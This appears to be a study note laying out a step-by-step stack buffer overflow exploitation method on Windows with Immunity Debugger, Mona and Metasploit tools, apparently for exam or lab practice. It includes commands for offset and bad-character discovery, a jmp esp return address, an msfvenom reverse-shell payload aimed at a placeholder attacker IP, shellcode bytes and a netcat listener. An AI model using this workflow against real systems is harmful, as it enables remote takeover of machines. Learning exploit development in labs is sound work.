#### Pre-Configuration

1. Configure the working space inside Immunity Debugger for the Mona plugin:

```
!mona config -set workingfolder c:\mona\%p
```

2. Open the target binary in Immunity Debugger and run it.

---

#### 1. Find Crashing Point

Run [[fuzzer.py]], take a note of the largest number of bytes that were sent (`CRASHBYTES`).

---

#### 2. Create Cyclic Pattern

With a `SIZE` of `CRASHBYTES` + 400 :

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [SIZE]
```

1. Paste the generated payload into [[exploit.py]] .
2. Restart the binary in Immunity Debugger, run `exploit.py` and calculate the offset using Mona:

```
!mona findmsp -distance [SIZE]
```

5. Set offset in `exploit.py` and `retn` to `BBBB`.

---

#### 3. Detect Bad Chars

1. Restart Immunity Debugger and generate a bytearray using Mona exluding the nullbyte:

```
!mona bytearray -b "\x00"
```

2. Generate an identical string of bad chars using the python script [[badchars.py]] excluding the nullbyte.
3. Update the [[exploit.py]] payload with the generated badchars.
4. Reload the binary in Immunity Debugger and run the modified [[exploit.py]], copy the `ESP` register address (`ESPADDR`) and perform a comparsion between the pre-generated bytearray and the injected payload: 

```
!mona compare -f C:\mona\oscp\bytearray.bin -a [ESPADDR]
```

5. Remember the newly detected `badchars` and generate a new bytearray using Mona. Update the `bytearray.py` and generate a new payload. Repeat the process above until all badchars are detected.

**Notice!*** Byte-chains can be eliminated: 

```
\x00\x01\x02\x03\x04\x23\x24\x3c\x3d\x83\x84\xba\xbb => \x00\x23\x3c\x83\xba
```

---
#### 3.5 Find jump point

1. Search with mona for possible return addresses for the exploit

```
!mona jmp -r esp -cpb "[BADCHARS]"
```

2. choose one pointer from the list of pointers (does not necesserily have to be `jmp esp`)

```
0x625011AF : jmp esp | ...
0x625011BB : jmp esp | ...
...
```

3. add this address as `retn` value in `exploit.py` in `littl-endian` format.

```python
retn = "\xBB\x11\x50\x62"
```

---
#### 4. Generate Payload

1. Using `msfvenom` :

```
msfvenom -p windows/shell_reverse_tcp LHOST=[ATTACKER IP] LPORT=4444 EXITFUNC=thread -b "[BADCHARS]" -f c
```

2. Copy the shellcode into [[exploit.py]] using the following notation:

```python
payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d"
"\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6"
"\x19\x53\xd0\x92\x19\x53\x2e\x1d")
```

---

#### 5. Prepend NOPs

Set the padding inside `exploit.py` to a bunch of `NOP` :

```
padding = "\x90" * 16
```

---

#### 6. Exploit

Start a listener on the attacker machine: `nc -lvp 4444` and execute [[exploit.py]] .